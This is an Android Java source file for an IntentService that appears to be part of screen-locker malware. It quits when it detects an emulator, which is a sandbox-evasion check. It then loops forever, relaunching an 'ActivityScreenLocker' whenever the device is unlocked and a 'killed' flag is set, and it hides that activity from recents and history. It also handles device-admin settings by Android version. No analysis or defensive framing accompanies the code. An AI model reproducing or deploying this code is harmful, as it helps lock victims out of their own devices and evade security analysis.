package myapp.stuff.example;

import android.app.IntentService;
import android.app.KeyguardManager;
import android.content.Intent;
import android.os.Build;

import java.util.concurrent.TimeUnit;

import myapp.stuff.example.Activity.ActivityScreenLocker;


public class StartWhileRequest extends IntentService {

    Constants const_ = new Constants();
    int interval;
    boolean adminStart;
    UtilsClass SF = new UtilsClass();

    public StartWhileRequest() {
        super("StartWhileRequest");
    }

    @Override
    protected void onHandleIntent(Intent intent) {
        if(SF.isEmulator())return;
        if(const_.DeviceAdmin==0)
            adminStart=false;
        else if(const_.DeviceAdmin==1)
            adminStart=true;
        else if(const_.DeviceAdmin==2){
            if (Build.VERSION.SDK_INT <= 23)
                adminStart=true;
            else
                adminStart=false;
        }
        while(true){
            interval=1500;
            try {TimeUnit.MILLISECONDS.sleep(interval);} catch (InterruptedException e) {e.printStackTrace();}
            KeyguardManager km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
            boolean locked = km.inKeyguardRestrictedInputMode();
            if (locked == false) {
                if (UtilsClass.killed){
                    // System.out.println("start: locker");
                    Intent dialogIntent = new Intent(this, ActivityScreenLocker.class);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
                    dialogIntent.addFlags(Intent.FLAG_ACTIVITY_NO_HISTORY);
                    startActivity(dialogIntent);
                } else if (!UtilsClass.killed){
                    stopSelf();
                }
            }
        }
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        System.out.println("exit: StartWhileRquest");
    }
}
